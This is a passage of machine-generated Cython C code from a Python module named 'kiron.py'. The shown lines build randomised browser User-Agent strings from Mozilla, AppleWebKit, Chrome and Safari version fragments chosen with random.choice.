    PyObject *__pyx_callargs[2] = {__pyx_t_8, __pyx_t_2};
    __pyx_t_1 = __Pyx_PyObject_FastCall(__pyx_t_4, __pyx_callargs+1-__pyx_t_5, 1+__pyx_t_5);
    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 144, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  }
  __pyx_t_4 = __Pyx_PyObject_Str(__pyx_t_1); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 144, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyObject_FormatSimple(__pyx_t_4, __pyx_empty_unicode); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 144, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_1) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_1) : __pyx_t_7;
  __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_1);
  __Pyx_GIVEREF(__pyx_t_1);
  PyTuple_SET_ITEM(__pyx_t_3, 1, __pyx_t_1);
  __pyx_t_1 = 0;
  __Pyx_INCREF(__pyx_kp_u_1_en_US_AppleWebKit_534);
  __pyx_t_6 += 27;
  __Pyx_GIVEREF(__pyx_kp_u_1_en_US_AppleWebKit_534);
  PyTuple_SET_ITEM(__pyx_t_3, 2, __pyx_kp_u_1_en_US_AppleWebKit_534);
  __pyx_t_1 = __Pyx_PyObject_FormatSimple(__pyx_v_aV, __pyx_empty_unicode); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 144, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_1) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_1) : __pyx_t_7;
  __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_1);
  __Pyx_GIVEREF(__pyx_t_1);
  PyTuple_SET_ITEM(__pyx_t_3, 3, __pyx_t_1);
  __pyx_t_1 = 0;
  __Pyx_INCREF(__pyx_kp_u_KHTML_like_Gecko_Chrome);
  __pyx_t_6 += 28;
  __Pyx_GIVEREF(__pyx_kp_u_KHTML_like_Gecko_Chrome);
  PyTuple_SET_ITEM(__pyx_t_3, 4, __pyx_kp_u_KHTML_like_Gecko_Chrome);
  __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_random); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 144, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_choice); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 144, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_4 = __Pyx_PyObject_Call(__pyx_builtin_range, __pyx_tuple__7, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 144, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_8 = NULL;
  __pyx_t_5 = 0;
  #if CYTHON_UNPACK_METHODS
  if (unlikely(PyMethod_Check(__pyx_t_2))) {
    __pyx_t_8 = PyMethod_GET_SELF(__pyx_t_2);
    if (likely(__pyx_t_8)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
      __Pyx_INCREF(__pyx_t_8);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_2, function);
      __pyx_t_5 = 1;
    }
  }
  #endif
  {
    PyObject *__pyx_callargs[2] = {__pyx_t_8, __pyx_t_4};
    __pyx_t_1 = __Pyx_PyObject_FastCall(__pyx_t_2, __pyx_callargs+1-__pyx_t_5, 1+__pyx_t_5);
    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 144, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  }
  __pyx_t_2 = __Pyx_PyObject_Str(__pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 144, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyObject_FormatSimple(__pyx_t_2, __pyx_empty_unicode); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 144, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_1) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_1) : __pyx_t_7;
  __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_1);
  __Pyx_GIVEREF(__pyx_t_1);
  PyTuple_SET_ITEM(__pyx_t_3, 5, __pyx_t_1);
  __pyx_t_1 = 0;
  __Pyx_INCREF(__pyx_kp_u_0);
  __pyx_t_6 += 3;
  __Pyx_GIVEREF(__pyx_kp_u_0);
  PyTuple_SET_ITEM(__pyx_t_3, 6, __pyx_kp_u_0);
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_random); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 144, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_choice); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 144, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyObject_Call(__pyx_builtin_range, __pyx_tuple__8, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 144, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_8 = NULL;
  __pyx_t_5 = 0;
  #if CYTHON_UNPACK_METHODS
  if (unlikely(PyMethod_Check(__pyx_t_4))) {
    __pyx_t_8 = PyMethod_GET_SELF(__pyx_t_4);
    if (likely(__pyx_t_8)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
      __Pyx_INCREF(__pyx_t_8);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_4, function);
      __pyx_t_5 = 1;
    }
  }
  #endif
  {
    PyObject *__pyx_callargs[2] = {__pyx_t_8, __pyx_t_2};
    __pyx_t_1 = __Pyx_PyObject_FastCall(__pyx_t_4, __pyx_callargs+1-__pyx_t_5, 1+__pyx_t_5);
    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 144, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  }
  __pyx_t_4 = __Pyx_PyObject_Str(__pyx_t_1); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 144, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyObject_FormatSimple(__pyx_t_4, __pyx_empty_unicode); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 144, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_1) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_1) : __pyx_t_7;
  __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_1);
  __Pyx_GIVEREF(__pyx_t_1);
  PyTuple_SET_ITEM(__pyx_t_3, 7, __pyx_t_1);
  __pyx_t_1 = 0;
  __Pyx_INCREF(__pyx_kp_u_0_Safari_534);
  __pyx_t_6 += 14;
  __Pyx_GIVEREF(__pyx_kp_u_0_Safari_534);
  PyTuple_SET_ITEM(__pyx_t_3, 8, __pyx_kp_u_0_Safari_534);
  __pyx_t_1 = __Pyx_PyObject_FormatSimple(__pyx_v_aV, __pyx_empty_unicode); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 144, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_1) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_1) : __pyx_t_7;
  __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_1);
  __Pyx_GIVEREF(__pyx_t_1);
  PyTuple_SET_ITEM(__pyx_t_3, 9, __pyx_t_1);
  __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyUnicode_Join(__pyx_t_3, 10, __pyx_t_6, __pyx_t_7); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 144, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_v_A = ((PyObject*)__pyx_t_1);
  __pyx_t_1 = 0;

  /* "kiron.py":145
 *     aV=str(random.choice(range(10,20)))
 *     A=f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5,7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8,12)))}.0.{str(random.choice(range(552,661)))}.0 Safari/534.{aV}"
 *     bV=str(random.choice(range(1,36)))             # <<<<<<<<<<<<<<
 *     bx=str(random.choice(range(34,38)))
 *     bz=f"5{bx}.{bV}"
 */
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_random); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 145, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_choice); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 145, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_PyObject_Call(__pyx_builtin_range, __pyx_tuple__9, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 145, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_2 = NULL;
  __pyx_t_5 = 0;
  #if CYTHON_UNPACK_METHODS
  if (unlikely(PyMethod_Check(__pyx_t_4))) {
    __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_4);
    if (likely(__pyx_t_2)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
      __Pyx_INCREF(__pyx_t_2);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_4, function);
      __pyx_t_5 = 1;
    }
  }
  #endif
  {
    PyObject *__pyx_callargs[2] = {__pyx_t_2, __pyx_t_3};
    __pyx_t_1 = __Pyx_PyObject_FastCall(__pyx_t_4, __pyx_callargs+1-__pyx_t_5, 1+__pyx_t_5);
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 145, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  }
  __pyx_t_4 = __Pyx_PyObject_Str(__pyx_t_1); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 145, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_v_bV = __pyx_t_4;
  __pyx_t_4 = 0;

  /* "kiron.py":146
 *     A=f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5,7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8,12)))}.0.{str(random.choice(range(552,661)))}.0 Safari/534.{aV}"
 *     bV=str(random.choice(range(1,36)))
 *     bx=str(random.choice(range(34,38)))             # <<<<<<<<<<<<<<
 *     bz=f"5{bx}.{bV}"
 *     B=f"Mozilla/5.0 (Windows NT {str(random.choice(range(5,7)))}.{str(random.choice(['2','1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12,42)))}.0.{str(random.choice(range(742,2200)))}.{str(random.choice(range(1,120)))} Safari/{bz}"
 */
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_random); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 146, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_choice); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 146, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_range, __pyx_tuple__10, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 146, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_2 = NULL;
  __pyx_t_5 = 0;
  #if CYTHON_UNPACK_METHODS
  if (unlikely(PyMethod_Check(__pyx_t_3))) {
    __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_3);
    if (likely(__pyx_t_2)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
      __Pyx_INCREF(__pyx_t_2);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_3, function);
      __pyx_t_5 = 1;
    }
  }
  #endif
  {
    PyObject *__pyx_callargs[2] = {__pyx_t_2, __pyx_t_1};
    __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_3, __pyx_callargs+1-__pyx_t_5, 1+__pyx_t_5);
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 146, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  }
  __pyx_t_3 = __Pyx_PyObject_Str(__pyx_t_4); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 146, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_v_bx = __pyx_t_3;
  __pyx_t_3 = 0;

  /* "kiron.py":147
 *     bV=str(random.choice(range(1,36)))
 *     bx=str(random.choice(range(34,38)))
 *     bz=f"5{bx}.{bV}"             # <<<<<<<<<<<<<<
 *     B=f"Mozilla/5.0 (Windows NT {str(random.choice(range(5,7)))}.{str(random.choice(['2','1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12,42)))}.0.{str(random.choice(range(742,2200)))}.{str(random.choice(range(1,120)))} Safari/{bz}"
 *     cV=str(random.choice(range(1,36)))
 */
  __pyx_t_3 = PyTuple_New(4); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 147, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_6 = 0;
  __pyx_t_7 = 127;
  __Pyx_INCREF(__pyx_kp_u_5);
  __pyx_t_6 += 1;
  __Pyx_GIVEREF(__pyx_kp_u_5);
  PyTuple_SET_ITEM(__pyx_t_3, 0, __pyx_kp_u_5);
  __pyx_t_4 = __Pyx_PyObject_FormatSimple(__pyx_v_bx, __pyx_empty_unicode); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 147, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) : __pyx_t_7;
  __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4);
  __Pyx_GIVEREF(__pyx_t_4);
  PyTuple_SET_ITEM(__pyx_t_3, 1, __pyx_t_4);
  __pyx_t_4 = 0;
  __Pyx_INCREF(__pyx_kp_u__11);
  __pyx_t_6 += 1;
  __Pyx_GIVEREF(__pyx_kp_u__11);
  PyTuple_SET_ITEM(__pyx_t_3, 2, __pyx_kp_u__11);
  __pyx_t_4 = __Pyx_PyObject_FormatSimple(__pyx_v_bV, __pyx_empty_unicode); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 147, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) : __pyx_t_7;
  __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4);
  __Pyx_GIVEREF(__pyx_t_4);
  PyTuple_SET_ITEM(__pyx_t_3, 3, __pyx_t_4);
  __pyx_t_4 = 0;
  __pyx_t_4 = __Pyx_PyUnicode_Join(__pyx_t_3, 4, __pyx_t_6, __pyx_t_7); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 147, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_v_bz = ((PyObject*)__pyx_t_4);
  __pyx_t_4 = 0;

  /* "kiron.py":148
 *     bx=str(random.choice(range(34,38)))
 *     bz=f"5{bx}.{bV}"
 *     B=f"Mozilla/5.0 (Windows NT {str(random.choice(range(5,7)))}.{str(random.choice(['2','1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12,42)))}.0.{str(random.choice(range(742,2200)))}.{str(random.choice(range(1,120)))} Safari/{bz}"             # <<<<<<<<<<<<<<
 *     cV=str(random.choice(range(1,36)))
 *     cx=str(random.choice(range(34,38)))
 */
  __pyx_t_4 = PyTuple_New(14); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 148, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_6 = 0;
  __pyx_t_7 = 127;
  __Pyx_INCREF(__pyx_kp_u_Mozilla_5_0_Windows_NT);
  __pyx_t_6 += 24;
  __Pyx_GIVEREF(__pyx_kp_u_Mozilla_5_0_Windows_NT);
  PyTuple_SET_ITEM(__pyx_t_4, 0, __pyx_kp_u_Mozilla_5_0_Windows_NT);
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_random); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 148, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_choice); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 148, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_range, __pyx_tuple__6, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 148, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_8 = NULL;
  __pyx_t_5 = 0;
  #if CYTHON_UNPACK_METHODS
  if (unlikely(PyMethod_Check(__pyx_t_2))) {
    __pyx_t_8 = PyMethod_GET_SELF(__pyx_t_2);
    if (likely(__pyx_t_8)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
      __Pyx_INCREF(__pyx_t_8);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_2, function);
      __pyx_t_5 = 1;
    }
  }
  #endif
  {
    PyObject *__pyx_callargs[2] = {__pyx_t_8, __pyx_t_1};
    __pyx_t_3 = __Pyx_PyObject_FastCall(__pyx_t_2, __pyx_callargs+1-__pyx_t_5, 1+__pyx_t_5);
    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 148, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  }
  __pyx_t_2 = __Pyx_PyObject_Str(__pyx_t_3); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 148, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_PyObject_FormatSimple(__pyx_t_2, __pyx_empty_unicode); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 148, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) : __pyx_t_7;
  __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_3);
  __Pyx_GIVEREF(__pyx_t_3);
  PyTuple_SET_ITEM(__pyx_t_4, 1, __pyx_t_3);
  __pyx_t_3 = 0;
  __Pyx_INCREF(__pyx_kp_u__11);
  __pyx_t_6 += 1;
  __Pyx_GIVEREF(__pyx_kp_u__11);
  PyTuple_SET_ITEM(__pyx_t_4, 2, __pyx_kp_u__11);
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_random); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 148, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_choice); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 148, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = PyList_New(2); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 148, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_kp_s_2);
  __Pyx_GIVEREF(__pyx_kp_s_2);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 0, __pyx_kp_s_2)) __PYX_ERR(0, 148, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_1);
  __Pyx_GIVEREF(__pyx_kp_s_1);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 1, __pyx_kp_s_1)) __PYX_ERR(0, 148, __pyx_L1_error);
  __pyx_t_8 = NULL;
  __pyx_t_5 = 0;
  #if CYTHON_UNPACK_METHODS
  if (unlikely(PyMethod_Check(__pyx_t_1))) {
    __pyx_t_8 = PyMethod_GET_SELF(__pyx_t_1);
    if (likely(__pyx_t_8)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
      __Pyx_INCREF(__pyx_t_8);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_1, function);
      __pyx_t_5 = 1;
    }
  }
  #endif
  {
    PyObject *__pyx_callargs[2] = {__pyx_t_8, __pyx_t_2};
    __pyx_t_3 = __Pyx_PyObject_FastCall(__pyx_t_1, __pyx_callargs+1-__pyx_t_5, 1+__pyx_t_5);
    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 148, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  }
  __pyx_t_1 = __Pyx_PyObject_Str(__pyx_t_3); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 148, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_PyObject_FormatSimple(__pyx_t_1, __pyx_empty_unicode); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 148, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) : __pyx_t_7;
  __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_3);
  __Pyx_GIVEREF(__pyx_t_3);
  PyTuple_SET_ITEM(__pyx_t_4, 3, __pyx_t_3);
  __pyx_t_3 = 0;
  __Pyx_INCREF(__pyx_kp_u_AppleWebKit);
  __pyx_t_6 += 14;
  __Pyx_GIVEREF(__pyx_kp_u_AppleWebKit);
  PyTuple_SET_ITEM(__pyx_t_4, 4, __pyx_kp_u_AppleWebKit);
  __Pyx_INCREF(__pyx_v_bz);
  __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_v_bz) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_v_bz) : __pyx_t_7;
  __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_v_bz);
  __Pyx_GIVEREF(__pyx_v_bz);
  PyTuple_SET_ITEM(__pyx_t_4, 5, __pyx_v_bz);
  __Pyx_INCREF(__pyx_kp_u_KHTML_like_Gecko_Chrome);
  __pyx_t_6 += 28;
  __Pyx_GIVEREF(__pyx_kp_u_KHTML_like_Gecko_Chrome);
  PyTuple_SET_ITEM(__pyx_t_4, 6, __pyx_kp_u_KHTML_like_Gecko_Chrome);
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_random); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 148, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_choice); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 148, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_range, __pyx_tuple__12, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 148, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_8 = NULL;
  __pyx_t_5 = 0;
  #if CYTHON_UNPACK_METHODS
  if (unlikely(PyMethod_Check(__pyx_t_2))) {
    __pyx_t_8 = PyMethod_GET_SELF(__pyx_t_2);
    if (likely(__pyx_t_8)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
      __Pyx_INCREF(__pyx_t_8);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_2, function);
      __pyx_t_5 = 1;
    }
  }
  #endif
  {
    PyObject *__pyx_callargs[2] = {__pyx_t_8, __pyx_t_1};
    __pyx_t_3 = __Pyx_PyObject_FastCall(__pyx_t_2, __pyx_callargs+1-__pyx_t_5, 1+__pyx_t_5);
    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 148, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  }
  __pyx_t_2 = __Pyx_PyObject_Str(__pyx_t_3); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 148, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_PyObject_FormatSimple(__pyx_t_2, __pyx_empty_unicode); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 148, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) : __pyx_t_7;
  __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_3);
  __Pyx_GIVEREF(__pyx_t_3);
  PyTuple_SET_ITEM(__pyx_t_4, 7, __pyx_t_3);
  __pyx_t_3 = 0;
